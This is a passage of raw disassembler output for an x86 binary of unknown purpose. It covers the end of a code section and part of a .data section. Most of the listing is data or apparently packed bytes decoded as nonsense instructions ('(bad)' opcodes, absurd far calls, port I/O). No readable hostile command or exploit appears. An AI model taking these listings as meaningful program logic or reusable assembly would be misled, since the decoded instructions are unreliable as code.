  41ccbf:	and    bl,dl
  41ccc1:	addr16 loope 0x41cd2f
  41ccc4:	pop    ecx
  41ccc5:	(bad)  
  41ccc6:	call   0x5c9a:0x4e6fbd7f
  41cccd:	push   0x30
  41cccf:	cmp    DWORD PTR [ebp+0x1a],esp
  41ccd2:	cli    
  41ccd3:	xlat   BYTE PTR ds:[ebx]
  41ccd4:	(bad)  
  41ccd5:	int    0x6d
  41ccd7:	cli    
  41ccd8:	aaa    
  41ccd9:	dec    esp
  41ccda:	jecxz  0x41cce0
  41ccdc:	or     DWORD PTR [ebx-0x56],esi
  41ccdf:	push   ecx
  41cce0:	mov    ds:0xd6f77ac0,al
  41cce5:	cwde   
  41cce6:	and    edi,esp
  41cce8:	push   es
  41cce9:	add    al,0x6f
  41cceb:	adc    ecx,ebx
  41cced:	jp     0x41cc86
  41ccef:	adc    eax,0x8dba1f5
  41ccf4:	mov    BYTE PTR [esi],dl
  41ccf6:	or     ebx,DWORD PTR ds:0x4ba2245c
  41ccfc:	jno    0x41cd32
  41ccfe:	pop    ebp
  41ccff:	and    ecx,edx
  41cd01:	mov    dh,BYTE PTR [edx+0x1d]
  41cd04:	jmp    0xbb21c8c9
  41cd09:	ds (bad) 
  41cd0b:	sbb    cl,cl
  41cd0d:	stos   DWORD PTR es:[edi],eax
  41cd0e:	push   ecx
  41cd0f:	in     al,0xd3
  41cd11:	mov    ds:0x7664607c,eax
  41cd16:	dec    ebp
  41cd17:	pusha  
  41cd18:	or     ecx,DWORD PTR [ebp-0x44]
  41cd1b:	mov    ah,0x45
  41cd1d:	les    esi,FWORD PTR [esi]
  41cd1f:	adc    edi,edx
  41cd21:	fmul   DWORD PTR [ecx+0x2e7b8629]
  41cd27:	popa   
  41cd28:	pop    edi
  41cd29:	pop    ecx
  41cd2a:	shl    BYTE PTR [ebp-0x46],1
  41cd2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd2e:	sar    DWORD PTR [ebp-0x28],0x76
  41cd32:	data16 ss ja 0x41ccf5
  41cd36:	rcl    BYTE PTR [edx-0x1c],cl
  41cd39:	pushf  
  41cd3a:	add    eax,0x386f60cd
  41cd3f:	sbb    eax,0x9cdc43a6
  41cd44:	pop    edx
  41cd45:	mov    edi,0xe7bbecdf
  41cd4a:	ss add al,0x70
  41cd4d:	aas    
  41cd4e:	mov    WORD PTR [edi-0x267e0d78],es
  41cd54:	dec    ebx
  41cd55:	inc    edx
  41cd56:	adc    dh,al
  41cd58:	jne    0x41cd1d
  41cd5a:	out    dx,al
  41cd5b:	and    DWORD PTR [edi+esi*1+0x76],ebx
  41cd5f:	retf   
  41cd60:	fnstenv [ecx-0x6a35c3f]
  41cd66:	mov    ah,0x45
  41cd68:	jle    0x41cdc5
  41cd6a:	leave  
  41cd6b:	ret    0x10

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    BYTE PTR [ebx+ebp*4+0x2],dl
  41d41f:	add    BYTE PTR [ebp+ebx*4+0x2],dl
	...
  41d42b:	add    BYTE PTR [edi],ch
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
